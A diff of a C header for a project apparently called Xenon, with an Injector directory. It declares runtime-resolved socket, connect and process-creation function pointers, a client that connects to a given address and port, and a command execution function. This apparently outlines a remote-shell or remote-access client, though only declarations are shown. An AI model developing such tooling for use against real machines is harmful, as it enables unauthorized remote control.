@@ -1,16 +1,11 @@
 #ifndef CXENONh_H
 #define CXENONh_H
 
-
-<<<<<<< HEAD
-#include "../Include/driver/socket.h"
+#include "../../../Include/driver/socket.h"
 #include "../../../Injector/Dependencies/parse/parse.h"
 
-=======
->>>>>>> 5f705d909d599db565c4af386cf2bfc55791323f
 #define Exit -2
 #define UNKNOWN 2
-#define INADDR_NONE -1
 
 #if defined(_WIN32)
 
@@ -23,10 +18,23 @@ int WININIT(void);
 struct functionaddr
 {
     
-    SOCKET* (function_socket)(int af, int type, int protocol);
-    int* (function_connect)(SOCKET s, const sockaddr* name, int namelen);
-    int* (function_WSAcleanup)(void);
-    int* (function_WSAstartup)(WORD wordedversion, LPWSADATA lpWSAData);
+    SOCKET (*function_socket)(int, int, int);
+    int* (*function_connect)(SOCKET, const struct sockaddr*, int);
+    int* (*function_WSAcleanup)(void);
+    int* (*function_WSAstartup)(WORD, LPWSADATA);
+    BOOL* (*function_process)(LPCSTR,
+                            LPSTR,
+                            LPSECURITY_ATTRIBUTES,
+                            LPSECURITY_ATTRIBUTES,
+                            BOOL,
+                            DWORD,
+                            LPVOID,
+                            LPCSTR,
+                            LPSTARTUPINFOA,
+                            LPPROCESS_INFORMATION
+                            );
+    
+    
     
 };
 
@@ -35,7 +43,6 @@ enum _USTATUS
 
 	ONLINE=0x00,
 	OFFLINE=0x01,
-	UNKNOWN=0x02
 
 };
 
@@ -52,6 +59,7 @@ struct functionaddr GetFunctionVA(struct functionaddr* funcVA);
 pClientCTX CliInit(const char* inetaddr, const int port);
 SOCKET client_socket(SOCKET Socket);
 SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
-int execmd(SOCKET Socket);
+int execute(const char* process);
 
+#endif
 #endif
